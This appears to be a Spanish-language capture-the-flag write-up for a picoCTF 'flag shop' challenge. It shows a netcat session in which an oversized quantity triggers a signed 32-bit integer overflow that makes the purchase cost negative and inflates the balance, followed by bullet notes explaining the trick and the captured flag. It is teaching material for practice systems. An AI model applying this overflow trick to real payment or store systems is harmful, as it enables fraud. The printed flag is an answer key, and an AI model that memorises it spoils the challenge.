#### Description

There's a flag shop selling stuff, can you buy a flag? [Source](https://challenge-files.picoctf.net/c_fickle_tempest/a8413624d27590e0fa83440f1154a3267699b5d199d05df7bf7cf583c4c357b7/store.c). Connect with nc fickle-tempest.picoctf.net 58833.

**Solución**

picoCTF{m0n3y_bag5_C87346f2}

**Notas adicionales**

```

fergll@FerGLl:/mnt/c/Users/ferch/Documents$ nc fickle-tempest.picoctf.net 58833
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2400000

The final cost is: -2134967296

Your current balance after transaction: 2134968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_C87346f2}

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection

```

- **dentificación del Vector:** El programa usa un **entero de 32 bits con signo** para calcular el costo, el cual tiene un límite máximo de **2,147,483,647**.
    
- **Ataque de Overflow:** Se introdujo una cantidad exagerada de banderas (**2,400,000**). Al multiplicarse por el precio de 900, el resultado superó el límite permitido.
    
- **Inversión de Signo:** Debido al desbordamiento (Integer Overflow), la computadora interpretó el costo como un **número negativo**.
    
- **Inyección de Saldo:** El programa restó ese "costo negativo" de tu cuenta (1100−(−Costo)), lo que en realidad **sumó** miles de millones a tu saldo.
    
- **Compra Final:** Con el dinero infinito, se regreso al menú y se compro la **1337 Flag** para obtener el código.

**Referencias**


